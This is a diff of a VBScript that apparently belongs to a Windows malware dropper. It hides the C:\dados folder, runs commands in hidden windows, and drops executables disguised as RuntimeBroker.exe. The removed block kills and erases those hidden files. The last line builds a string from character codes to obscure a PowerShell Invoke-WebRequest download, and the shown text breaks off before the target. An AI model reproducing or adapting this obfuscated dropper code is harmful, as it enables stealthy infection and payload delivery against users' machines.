@@ -7,34 +7,8 @@ Set shl = CreateObject("WScript.Shell")
 
 shl.Run "cmd /c attrib +H C:\dados", 0
 
-'clear old buggy version
 If fso.FileExists(fldr+"\macro_wrd.vbs") = True Then
 	WScript.Quit
-End If
-'no need to obfuscate these
-If fso.FileExists(fldr+"\RuntimeBroker.exe") = True Then
-	If fso.FileExists(fldr + "\v2.del") = True Then
-		zzCmd0 = "cmd /c taskkill /f /im RuntimeBroker.exe"
-		zzCmd1 = "cmd /c taskkill /f /im ziriguidum.exe"
-		zzCmd2 = "cmd /c erase C:\dados\RuntimeBroker.exe /A H"
-		zzCmd3 = "cmd /c erase C:\dados\ziriguidum.exe /A H"
-		zzCmd4 = "cmd /c erase C:\dados\settings.json /A H"
-		zzCmd5 = "cmd /c erase C:\dados\inj.vbs /A H"
-		zzCmd6 = "cmd /c erase C:\dados\macro_final.vbs /A H"
-		zzCmd7 = "cmd /c erase C:\dados\comp.exe /A H"
-		zzCmd8 = "cmd /c erase C:\dados\v2.del /A H"
-		shl.Run zzCmd0, 0
-		WScript.Sleep(10000)
-		shl.Run zzCmd1, 0
-		WScript.Sleep(10000)
-		shl.Run zzCmd2, 0
-		shl.Run zzCmd3, 0
-		shl.Run zzCmd4, 0
-		shl.Run zzCmd5, 0
-		shl.Run zzCmd6, 0
-		shl.Run zzCmd7, 0
-		WScript.Sleep(10000)
-	End If
 End If
 
 psCmd1p1 = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+" -Command "+chr(34)+chr(73)+chr(110)+chr(118)+chr(111)+chr(107)+chr(101)+chr(45)+chr(87)+chr(101)+chr(98)+chr(82)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)
